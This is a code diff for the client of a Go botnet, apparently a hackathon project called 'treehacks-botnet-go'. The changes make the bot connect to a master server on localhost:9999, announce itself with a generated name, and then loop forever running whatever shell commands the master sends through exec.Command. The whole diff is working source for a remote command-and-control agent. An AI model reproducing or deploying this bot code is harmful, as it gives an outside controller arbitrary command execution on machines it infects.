@@ -1,22 +1,20 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	gonanoid "github.com/matoous/go-nanoid/v2"
+	"github.com/tfpgh/treehacks-botnet-go/internal"
 	"net"
 	"os"
+	"os/exec"
 	"strconv"
+	"strings"
+	"time"
 )
 
 const MASTER_HOST string = "localhost"
 const MASTER_PORT uint16 = 9999
-
-type MasterLink struct {
-	host       string
-	port       uint16
-	name       string
-	connection net.Conn
-}
 
 func generateBotName() (string, error) {
 	id, err := gonanoid.New()
@@ -36,34 +34,23 @@ func generateBotName() (string, error) {
 
 }
 
-func beginConnection(host string, port uint16, name string) MasterLink {
-	connString := host + ":" + strconv.Itoa(int(port))
-	connection, err := net.Dial("tcp", connString)
+func beginConnection(host string, port uint16, name string) *net.Conn {
+	connectionString := host + ":" + strconv.Itoa(int(port))
+	connection, err := net.Dial("tcp", connectionString)
 
 	if err != nil {
-		fmt.Printf("Connection to master could not be established at %v. Panicking!\n", connString)
+		fmt.Printf("Connection to master could not be established at %v. Panicking!\n", connectionString)
 		panic(err)
 	}
 
-	link := MasterLink{host, port, name, connection}
+	helloPacketJSON, _ := json.Marshal(internal.HelloPacket{BotName: name})
 
-	_, err = link.connection.Write([]byte(fmt.Sprintf("Hello from bot %v!", name)))
+	_, err = connection.Write(helloPacketJSON)
 	if err != nil {
 		fmt.Printf("Error writing: %v\n", err)
 	}
-	buffer := make([]byte, 128)
-	bLen, err := link.connection.Read(buffer)
-	if err != nil {
-		fmt.Printf("Error reading: %v\n", err)
-	}
-	fmt.Println("Received: ", string(buffer[:bLen]))
 
-	return link
-}
-
-func (link *MasterLink) endConnection() {
-	fmt.Println(link.connection)
-	_ = link.connection.Close()
+	return &connection
 }
 
 func main() {
@@ -74,6 +61,37 @@ func main() {
 		fmt.Printf("Generated unique bot name: \"%v\"\n", botName)
 	}
 
-	link := beginConnection(MASTER_HOST, MASTER_PORT, botName)
-	defer link.endConnection()
+	connection := beginConnection(MASTER_HOST, MASTER_PORT, botName)
+	defer func(conn net.Conn) {
+		err := conn.Close()
+		if err != nil {
+			fmt.Println("Error closing connection")
+		}
+	}(*connection)
+
+	for {
+		buffer := make([]byte, 128)
+		bLen, err := (*connection).Read(buffer)
+		if err != nil {
+			fmt.Println("Error reading bot connection")
+			time.Sleep(time.Millisecond * 500)
+			continue
+		}
+
+		var commandPacket internal.CommandPacket
+		err = json.Unmarshal(buffer[:bLen], &commandPacket)
+		if err != nil {
+			fmt.Println("Master sent invalid data")
+			continue
+		}
+		command := strings.Split(commandPacket.Command, " ")
+		if len(command) == 1 {
+			output, _ := exec.Command(command[0]).Output()
+			fmt.Println(string(output))
+		} else {
+			output, _ := exec.Command(command[0], command[1:]...).Output()
+			fmt.Println(string(output))
+		}
+
+	}
 }
